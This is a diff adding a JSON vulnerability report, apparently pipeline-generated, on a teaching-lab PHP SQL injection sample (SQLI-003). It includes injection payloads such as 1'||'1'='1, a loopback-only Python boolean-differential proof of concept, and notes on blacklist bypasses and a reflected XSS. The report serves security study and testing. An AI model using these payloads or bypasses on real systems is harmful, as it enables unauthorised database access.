@@ -1,0 +1,151 @@
+{
+  "schema_version": "wp2-output-v1",
+  "sample_id": "SQLI-003",
+  "input_version": "v2",
+  "prompt_version": "v1",
+  "analysis_stage": "parent",
+  "received_packet_ids": [
+    "SQLI-003"
+  ],
+  "prediction": "存在候选",
+  "verdict": "待验证",
+  "confidence": {
+    "level": "high",
+    "reason": "静态数据流完整：第7行直接读取 $_GET['id']，第13行仅经 blacklist() 过滤，而第40-41行只删除 or/AND 子串（不处理单引号、空格、注释符与 UNION 等关键字组合）；第16行把过滤后的值拼进单引号字符串常量，第17行 mysql_query 执行，第21-25行回显 username/password、第30行回显 mysql_error()，属可观察的业务输出路径。缺少运行证据，因此不升级为确认。"
+  },
+  "findings": [
+    {
+      "finding_id": "SQLI-003",
+      "vulnerability_type": "SQL注入（单引号闭合字符串型，黑名单仅过滤 OR/AND）",
+      "locations": [
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 7,
+          "line_end": 7,
+          "quote": "$id=$_GET['id'];"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 16,
+          "line_end": 16,
+          "quote": "$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 17,
+          "line_end": 17,
+          "quote": "$result=mysql_query($sql);"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 40,
+          "line_end": 40,
+          "quote": "$id= preg_replace('/or/i',\"\", $id);"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 41,
+          "line_end": 41,
+          "quote": "$id= preg_replace('/AND/i',\"\", $id);"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 30,
+          "line_end": 30,
+          "quote": "print_r(mysql_error());"
+        }
+      ],
+      "data_flow": [
+        "第5行 isset($_GET['id']) 判定入口，第7行把请求参数原样赋给 $id，无类型转换、白名单或长度校验。",
+        "第9-11行把原始 $id 追加写入 result.txt（记录发生在过滤之前，仅是本地文件写入观察点，不是注入点）。",
+        "第13行调用 blacklist($id)；第40-41行用 preg_replace('/or/i') 与 preg_replace('/AND/i') 删除子串，其余字符（单引号、空格、等号、竖线、括号、注释符、UNION/SELECT）全部保留。",
+        "第16行把过滤后的 $id 直接插入单引号包裹的 SQL 字符串：id='$id'，形成 SELECT * FROM users WHERE id='...' LIMIT 0,1。",
+        "第17行 mysql_query 执行拼接结果，第18行 mysql_fetch_array 读取行。",
+        "第19行 if($row) 分支：第21-25行把 username/password 直接回显；第29-31行在无结果时回显 mysql_error()，构成报错回显观察点。",
+        "第44行把过滤后的输入回显到 HTML（$hint），是独立的反射输出点（见 risk_notes）。"
+      ],
+      "principle": "参数进入单引号字符串常量，攻击者只需闭合单引号即可改写 SQL 语法。blacklist 仅删除 or/AND 文本，未转义引号、未使用参数化，因此不含 OR/AND 字样的载荷原样通过。例如 id=1'||'1'='1 生成 WHERE id='1' || '1'='1'，MySQL 中 '||' 默认表示逻辑或，条件恒真返回首行；把右侧改为 '2' 则条件恒假、无行返回，从而形成可对照的布尔差分。也可使用 UNION SELECT 或报错函数（本草案不采用，避免导出数据）。",
+      "impact": "该路径可绕过 id 的数值语义读取 users 表中任意行，返回 username 与 password 字段，可能被用于登录绕过或口令哈希窃取；mysql_error() 回显还可辅助构造报错型注入。影响范围受 LIMIT 0,1 与单行输出限制，但 UNION/布尔注入可逐行或逐条件扩展。",
+      "preconditions": [
+        "目标为已部署的本地授权靶场，且 ../sql-connections/sql-connect.php 能成功连接 security 库并选中 users 表。",
+        "PHP 运行环境仍提供 mysql_* 兼容接口（mysql_query/mysql_fetch_array）。",
+        "id 参数在该片段之前未经过上层参数化、转义或严格数值白名单。",
+        "数据库为 MySQL/MariaDB 且 sql_mode 未开启 PIPES_AS_CONCAT（否则 '||' 变为字符串连接，需改用 UNION 或报错型载荷）。",
+        "users 表中存在 id=1 的行，才能用布尔差分对照基线。"
+      ],
+      "counterexamples": [
+        "若 sql-connect.php 或前置入口对 $_GET['id'] 执行 addslashes/mysql_real_escape_string（本包未提供该文件，无法确认），单引号闭合失效。",
+        "若 sql_mode 启用 PIPES_AS_CONCAT，'||' 不再表示逻辑或，本草案的布尔差分不成立（可换 UNION/报错载荷，但仍需重新验证）。",
+        "若前置 WAF/反向代理拦截单引号、竖线或空格，载荷可能被阻断；需要换等价载荷并重新评估。",
+        "若部署使用 PHP 7+ 且未安装 mysql_* 兼容层，调用直接报错，脚本路径不可运行（这是环境缺口，不是漏洞排除）。",
+        "若 users 表中 id=1 不存在，基线也无行，无法用本草案区分；需先确认基线行存在。"
+      ],
+      "poc": {
+        "status": "需人工适配",
+        "language": "python",
+        "code": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"SQLI-003 local-only SQL injection verification draft.\n\nScope: authorized local teaching lab only. The script refuses any target\nwhose host is not localhost/127.0.0.1/::1, never follows redirects, and\nnever dumps or enumerates database contents: it only compares a boolean\ndifferential on the 'id' GET parameter.\n\nUsage:\n    python3 sqli_003_check.py --base-url http://127.0.0.1:8080 --path /sqli/SQLI-003.php\n\"\"\"\n\nimport argparse\nimport http.client\nimport ipaddress\nimport sys\nimport urllib.parse\n\nLOOPBACK_NAMES = {\"localhost\", \"127.0.0.1\", \"::1\"}\nMARKER = \"Your Login name:\"\n\n\ndef check_target(base_url):\n    parsed = urllib.parse.urlsplit(base_url)\n    if parsed.scheme not in (\"http\", \"https\"):\n        raise ValueError(\"base URL must use http or https, got %r\" % parsed.scheme)\n    host = parsed.hostname or \"\"\n    if host in LOOPBACK_NAMES:\n        return parsed\n    try:\n        if ipaddress.ip_address(host).is_loopback:\n            return parsed\n    except ValueError:\n        pass\n    raise ValueError(\"refusing non-loopback target host: %r\" % host)\n\n\ndef get(base_url, path, param, value, timeout):\n    parsed = check_target(base_url)\n    sep = \"&\" if \"?\" in path else \"?\"\n    target = path + sep + urllib.parse.urlencode({param: value})\n    port = parsed.port\n    if parsed.scheme == \"https\":\n        conn = http.client.HTTPSConnection(parsed.hostname, port, timeout=timeout)\n    else:\n        conn = http.client.HTTPConnection(parsed.hostname, port, timeout=timeout)\n    try:\n        conn.request(\"GET\", target, headers={\"User-Agent\": \"wp2-local-sqli-check/1.0\"})\n        resp = conn.getresponse()\n        body = resp.read().decode(\"utf-8\", \"replace\")\n        return resp.status, resp.getheader(\"Location\"), body\n    finally:\n        conn.close()\n\n\ndef observe(base_url, path, param, value, timeout):\n    try:\n        status, location, body = get(base_url, path, param, value, timeout)\n    except (OSError, http.client.HTTPException, ValueError) as exc:\n        return {\"value\": value, \"kind\": \"request_error\", \"detail\": str(exc)}\n    if status in (301, 302, 303, 307, 308):\n        return {\"value\": value, \"kind\": \"redirect\", \"detail\": location or \"\"}\n    if status != 200:\n        return {\"value\": value, \"kind\": \"http_status_%d\" % status, \"detail\": \"\"}\n    if MARKER in body:\n        return {\"value\": value, \"kind\": \"row_returned\", \"detail\": \"\"}\n    return {\"value\": value, \"kind\": \"no_row\", \"detail\": \"\"}\n\n\ndef main(argv=None):\n    parser = argparse.ArgumentParser(description=\"Local-only SQLI-003 injection check\")\n    parser.add_argument(\"--base-url\", required=True,\n                        help=\"http(s)://localhost|127.0.0.1|::1[:port]\")\n    parser.add_argument(\"--path\", required=True,\n                        help=\"request path of the deployed sample, e.g. /sqli/SQLI-003.php\")\n    parser.add_argument(\"--param\", default=\"id\", help=\"vulnerable GET parameter name\")\n    parser.add_argument(\"--timeout\", type=float, default=5.0, help=\"per-request timeout in seconds\")\n    args = parser.parse_args(argv)\n\n    cases = [\n        (\"baseline\", \"1\"),\n        (\"boolean_true\", \"1'||'1'='1\"),\n        (\"boolean_false\", \"1'||'1'='2\"),\n    ]\n    results = {}\n    for label, value in cases:\n        results[label] = observe(args.base_url, args.path, args.param, value, args.timeout)\n        print(\"[%s] %-14s %s\" % (label, results[label][\"kind\"], results[label][\"detail\"]))\n    print(\"requests sent:\", \", \".join(\"%s=%s\" % (args.param, v) for _, v in cases))\n\n    ok = (results[\"baseline\"][\"kind\"] == \"row_returned\"\n          and results[\"boolean_true\"][\"kind\"] == \"row_returned\"\n          and results[\"boolean_false\"][\"kind\"] == \"no_row\")\n    print(\"expected differential observed:\", ok)\n    return 0 if ok else 2\n\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n",
+        "artifact_path": null,
+        "dependencies": [
+          "Python 3.8+，仅使用标准库：argparse、http.client、ipaddress、sys、urllib.parse",
+          "无需第三方库；http.client 默认不自动跟随重定向"
+        ],
+        "parameters": [
+          "--base-url：本地授权基址，只允许 http(s)://localhost / 127.0.0.1 / ::1（含端口），脚本对非回环主机直接拒绝",
+          "--path：已部署样本的请求路径，例如 /sqli/SQLI-003.php，需按实际部署改写",
+          "--param：GET 参数名，默认 id",
+          "--timeout：单请求超时秒数，默认 5"
+        ],
+        "steps": [
+          "在本地授权靶场确认样本已部署且可访问，记录源提交、PHP 版本、MySQL 版本与 sql_mode、认证状态。",
+          "保存脚本到本地工作目录（不入版本库的临时目录），用实际部署路径设置 --base-url 与 --path。",
+          "先请求 id=1 建立基线，确认响应含 'Your Login name:'。",
+          "发送 id=1'||'1'='1（过滤后无 or/AND 子串，单引号闭合后恒真）观察是否仍返回行。",
+          "发送对照 id=1'||'1'='2，观察是否无行返回（响应中不含 'Your Login name:'）。",
+          "保存三次请求的原始响应、命令与时间；注意该样本每次请求都会向 result.txt 追加一行，测试后按需清理/轮转该文件并记录。",
+          "若出现 3xx 跳转、401/403 或连接错误，先判定为认证/环境问题，不计作漏洞结论。"
+        ],
+        "expected_observation": "在同一部署条件下连续请求：id=1 返回含 'Your Login name:' 的行；id=1'||'1'='1 也返回行（因 '1'='1' 恒真）；id=1'||'1'='2 不返回行、响应中无 'Your Login name:'，且第44行 Hint 显示过滤后输入（其中 or/AND 被删除但引号与竖线保留）。三者构成布尔真/假对照，才说明单引号闭合与 SQL 语法改写成立。",
+        "success_criteria": "在同一会话/同一配置下同时满足：(1) id=1 返回行；(2) id=1'||'1'='1 返回行；(3) id=1'||'1'='2 不返回行。需保存三条原始响应与服务器端 SQL 日志（如可获取）作为对照。仅 HTTP 200、脚本正常退出或 Hint 回显输入本身不构成成功证据；任一对照不满足即记为未观察到。",
+        "limitations": [
+          "脚本未在任何环境运行，execution_status=未运行，所有现象均为静态预期，不是实测结果。",
+          "脚本只做布尔差分，不枚举、不导出数据；因此只能证明可注入性，不能证明可读取的具体数据范围。",
+          "假设 MySQL/MariaDB 默认 sql_mode；若启用 PIPES_AS_CONCAT 需人工改用 UNION/报错载荷。",
+          "实际部署路径、端口、users 表数据与认证要求未知，需人工适配。"
+        ],
+        "execution_status": "未运行"
+      }
+    }
+  ],
+  "exclusion_evidence": [],
+  "missing_context": [
+    "../sql-connections/sql-connect.php 的实际连接实现，以及其中是否对 $_GET 或全局输入执行 addslashes/mysql_real_escape_string/magic_quotes。",
+    "db-creds.inc 中的数据库类型、版本、连接账号权限（是否仅 SELECT）。",
+    "PHP 版本与 mysql_* 扩展/兼容层是否可用（PHP 7.0 起 mysql_* 已移除）。",
+    "MySQL/MariaDB 的 sql_mode，尤其是 PIPES_AS_CONCAT 是否开启。",
+    "样本的实际部署 URL 路径、Web 服务器重写规则与是否存在前置 WAF/代理。",
+    "users 表结构与数据（是否存在 id=1），以及 result.txt 的权限与读取方。",
+    "是否为登录后访问、是否存在统一鉴权或限流。"
+  ],
+  "risk_notes": [
+    "第44行把 blacklist 过滤后的 $hint 直接拼接进 HTML 输出，未做 HTML 编码，存在反射型 XSS 风险（如 id 含 <script> 且不含 or/AND 关键字）；属本次关注类型之外。",
+    "第9-11行把原始 id 未经净化追加写入 result.txt，存在日志注入/文件膨胀风险，且文件内容可能被其他组件读取。",
+    "第30行 print_r(mysql_error()) 向客户端回显数据库错误，泄露表名、列名与 SQL 片段，为信息泄露风险并辅助注入。",
+    "该入口无认证与 CSRF 保护，GET 请求即可触发并写入文件。",
+    "若 db-creds.inc 位于 Web 根目录且可被直接请求，可能泄露数据库凭据（本包未提供该文件，无法确认）。"
+  ],
+  "quality_notes": [
+    "使用已在 PHP 7.0 移除的 mysql_* 系列 API（mysql_query/mysql_fetch_array/mysql_error），属过时接口。",
+    "blacklist 为黑名单式防护：仅删除 or/AND，可通过 'oorr' 等双写重组（一次 preg_replace 后剩余 'or'）、大小写混写、注释分割、UNION/报错/时间盲注等方式绕过。",
+    "preg_replace 会删除字符串字面量中正常出现的 or/AND 子串（如 'order'、'password' 相关输入），可能产生误改与异常行为。",
+    "使用相对路径 include('../sql-connections/sql-connect.php')，依赖当前工作目录，部署位置变化即失效。",
+    "result.txt 无大小限制与并发写保护，长期运行会无限增长。",
+    "id 未做数值校验或类型转换，与提示语“numeric value”的语义不一致。"
+  ],
+  "limitations": [
+    "结论仅针对已提供的 45 行标准化代码片段，未覆盖连接文件、数据库配置与上层入口，不外推整个项目。",
+    "全部判断为静态分析；未运行任何 POC，execution_status=未运行，runtime_evidence 为空。",
+    "行号为标准化代码块内 1 起始的局部行号，不是 Prompt 文件行号。",
+    "影响范围（可读取的具体数据量、是否可写）未验证，仅按代码路径推断。"
+  ],
+  "runtime_evidence": []
+}
